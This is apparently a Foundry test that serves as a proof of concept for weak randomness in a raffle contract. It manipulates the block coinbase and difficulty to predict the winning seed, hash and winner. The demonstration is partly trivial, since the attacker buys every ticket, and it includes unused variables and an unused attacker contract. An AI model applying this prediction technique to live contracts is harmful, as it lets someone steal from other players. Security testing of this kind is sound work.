
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Ethraffle_v4b} from "../src/Ethraffle_v4b.sol";

contract AttackerContract {
    Ethraffle_v4b public raffle;
    
    constructor(Ethraffle_v4b _raffle) {
        raffle = _raffle;
    }
    
    function buyTicketsForAttacker() external payable {
        raffle.buyTickets{value: msg.value}();
    }
    
    receive() external payable {}
}

contract TestWeakRandomnessEthraffle_v4b is Test {
    Ethraffle_v4b public raffle;
    
    uint256 public constant TOTAL_TICKETS = 50;
    uint256 public constant PRIZE = 2.5 ether;
    uint256 public constant FEE = 0.03 ether;
    uint256 public constant PRICE_PER_TICKET = (PRIZE + FEE) / TOTAL_TICKETS;
    
    event RaffleResult(
        uint raffleId,
        uint winningNumber,
        address winningAddress,
        address seed1,
        address seed2,
        uint seed3,
        bytes32 randHash
    );

    function setUp() public {
        raffle = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(
        address blockCoinbase,
        uint256 blockDifficulty
    ) public {
        // --- 1. Constraints ---
        vm.assume(blockCoinbase != address(0));
        vm.assume(blockDifficulty > 0 && blockDifficulty < type(uint128).max);
        
        // --- 2. State Configuration ---
        
        // Create an attacker who will be the last buyer (msg.sender in chooseWinner)
        address attacker = makeAddr("attacker");
        
        // Fund the contract for ticket purchases
        uint256 totalCost = PRICE_PER_TICKET * TOTAL_TICKETS;
        vm.deal(attacker, totalCost + 1 ether);
        
        // Manipulate block environment
        vm.coinbase(blockCoinbase);
        vm.difficulty(blockDifficulty);
        
        // --- 3. Replication & Assertion ---
        
        // Buy 49 tickets first to set up contestants
        vm.startPrank(attacker);
        raffle.buyTickets{value: PRICE_PER_TICKET * 49}();
        vm.stopPrank();
        
        // Before buying the last ticket, predict the outcome
        // The attacker knows:
        // - block.coinbase (set by us)
        // - msg.sender (the attacker's address)
        // - block.difficulty (set by us)
        // - All contestant addresses (the attacker bought all tickets)
        
        // Predict seed1: contestants[uint(uint160(block.coinbase)) % totalTickets].addr
        uint256 seed1Index = uint256(uint160(blockCoinbase)) % TOTAL_TICKETS;
        address predictedSeed1 = attacker; // All tickets bought by attacker
        
        // Predict seed2: contestants[uint(uint160(msg.sender)) % totalTickets].addr
        uint256 seed2Index = uint256(uint160(attacker)) % TOTAL_TICKETS;
        address predictedSeed2 = attacker; // All tickets bought by attacker
        
        // Predict seed3: block.difficulty
        uint256 predictedSeed3 = blockDifficulty;
        
        // Calculate the predicted random hash
        bytes32 predictedRandHash = keccak256(abi.encodePacked(predictedSeed1, predictedSeed2, predictedSeed3));
        
        // Calculate the predicted winning number
        uint256 predictedWinningNumber = uint256(predictedRandHash) % TOTAL_TICKETS;
        
        // The predicted winner will be the attacker (since they own all tickets)
        address predictedWinner = attacker;
        
        // Record logs to capture the RaffleResult event
        vm.recordLogs();
        
        // Buy the last ticket to trigger chooseWinner
        vm.prank(attacker);
        raffle.buyTickets{value: PRICE_PER_TICKET}();
        
        // Get the emitted logs
        Vm.Log[] memory logs = vm.getRecordedLogs();
        
        // Find the RaffleResult event
        bool foundRaffleResult = false;
        uint256 actualWinningNumber;
        address actualWinningAddress;
        address actualSeed1;
        address actualSeed2;
        uint256 actualSeed3;
        bytes32 actualRandHash;
        
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("RaffleResult(uint256,uint256,address,address,address,uint256,bytes32)")) {
                (
                    ,
                    actualWinningNumber,
                    actualWinningAddress,
                    actualSeed1,
                    actualSeed2,
                    actualSeed3,
                    actualRandHash
                ) = abi.decode(logs[i].data, (uint256, uint256, address, address, address, uint256, bytes32));
                foundRaffleResult = true;
                break;
            }
        }
        
        // Assert that we found the event
        assertTrue(foundRaffleResult, "RaffleResult event not found");
        
        // Assert that our predictions match the actual results
        assertEq(actualSeed1, predictedSeed1, "Seed1 prediction failed");
        assertEq(actualSeed2, predictedSeed2, "Seed2 prediction failed");
        assertEq(actualSeed3, predictedSeed3, "Seed3 prediction failed");
        assertEq(actualRandHash, predictedRandHash, "RandHash prediction failed");
        assertEq(actualWinningNumber, predictedWinningNumber, "Winning number prediction failed");
        assertEq(actualWinningAddress, predictedWinner, "Winner prediction failed");
    }
}
